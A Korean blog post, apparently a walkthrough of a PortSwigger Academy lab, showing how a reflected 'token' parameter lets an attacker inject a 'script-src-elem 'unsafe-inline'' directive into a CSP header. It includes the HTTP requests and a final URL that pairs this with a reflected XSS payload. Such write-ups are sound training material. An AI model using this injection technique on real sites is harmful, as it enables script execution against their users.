---
layout: post
title: "Burp Academy-XSS 취약점: Reflected XSS protected by CSP, with CSP bypass"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2025-05-02 21:30:00 +0900
---

# 개요
- 취약점 설명 주소: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- 랩 주소: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
- PortSwigger Research(Policy injection으로 CSP 우회하기): https://portswigger.net/research/bypassing-csp-with-policy-injection
- 난이도: EXPERT (어려움)

# 취약점 개요: Policy Injection을 통한 CSP 우회
CSP 헤더에 사용자의 입력이 반영되는 웹사이트를 볼 수 있는 경우가 있다. 이는 대개 `report-uri` 지시어에 반영되는 형태로 나타난다. 해당 웹사이트가 사용자가 제어할 수 있는 매개변수를 반영하는 경우, 세미콜론을 삽입하여 자체 CSP 지시어를 추가할 수 있다. 일반적으로 이 `report-uri` 지시어는 CSP헤더 목록의 마지막에 있다. 이는 이 취약점을 악용하여 정책을 우회하려면 기존 지시어를 덮어써야 한다는 것을 의미한다.

일반적으로 이미 존재하는 `script-src` 지시어를 덮어쓸 수는 없다. 하지만 Chrome에서 최근 `script-src-elem` 지시어를 도입했는데, 이 지시어를 사용하면 `script` 요소를 제어할 수 있고, 이벤트는 제어할 수 없다. 중요한 것은 이 새로운 지시어를 통해 이미 존재하는  `script-src` 지시어를 덮어쓸 수 있다는 점 이다. 

# 랩 개요 
- 이 랩은 CSP 헤더를 사용하고 있고, 반사형 XSS취약점이 존재한다. 
- 랩을 풀려면 XSS공격을 수행해서 CSP를 우회하고 alert함수를 실행시킨다.  
- 랩에서 의도한 해답은 크롬에서만 실행된다는 것에 주의하자. 

```
This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.

Please note that the intended solution to this lab is only possible in Chrome.
```

# 풀이 
1. 일단 랩을 살펴본다. 랩 서버의 응답에 다음과 같은 헤더가 포함된 것을 볼 수 있다. report-uri 헤더에 
'/csp-report?token=' 라는 값이 지정되어 있다. 

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
X-Frame-Options: SAMEORIGIN
Content-Length: 5551

```

2. GET 요청에 token 파라메터를 추가해서 요청을 보내보면 파라메터에 지정한 값이 HTTP응답에 반영되는 것을 알 수 있다. 

```http
GET /?search=test_string&token=TESTTEST; HTTP/2
Host: 0a68000104c4343182cbd88600f0006c.web-security-academy.net
Cookie: session=86jmpddO0QNahOsU1SC25Pf99Gos3Y47
...

```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=TESTTEST
X-Frame-Options: SAMEORIGIN
Content-Length: 3157

```

3. CSP헤더는 세미콜론으로 구분된다. 따라서 세미콜론을 삽입할 수 있다면 CSP헤더 삽입이 가능할 것이다. 테스트해보면 세미콜론을 삽입가능한 것을 알 수 있다. CSP 헤더 `script-src-elem 'unsafe-inline'` 를 삽입하면 CSP를 헤더를 사실상 무효화시킬 수 있을 것이다. 시도해보니 가능했다. 

```http
GET /?search=test_string&token=TESTTEST;script-src-elem%20'unsafe-inline' HTTP/2
Host: 0a68000104c4343182cbd88600f0006c.web-security-academy.net
Cookie: session=86jmpddO0QNahOsU1SC25Pf99Gos3Y47
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=TESTTEST;script-src-elem 'unsafe-inline'
X-Frame-Options: SAMEORIGIN
Content-Length: 3157
```

4. 그러면 이제 반사형 XSS가 있는 곳만 찾으면 된다. 검색창에서 XSS가 가능한 것을 알아냈다. 

![](/images/burp-academy-xss-31-1.png)

5. 그러면 이제 찾은 취약점들을 조합한다. 다음 URL로 접근하면 alert창이 뜨는 것을 알 수 있다. 

```
https://0a68000104c4343182cbd88600f0006c.web-security-academy.net/?search=%22%2F%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&token=TESTTEST;script-src-elem%20%27unsafe-inline%27
```

6. 랩이 풀렸다. 

![](/images/burp-academy-xss-31-success.png)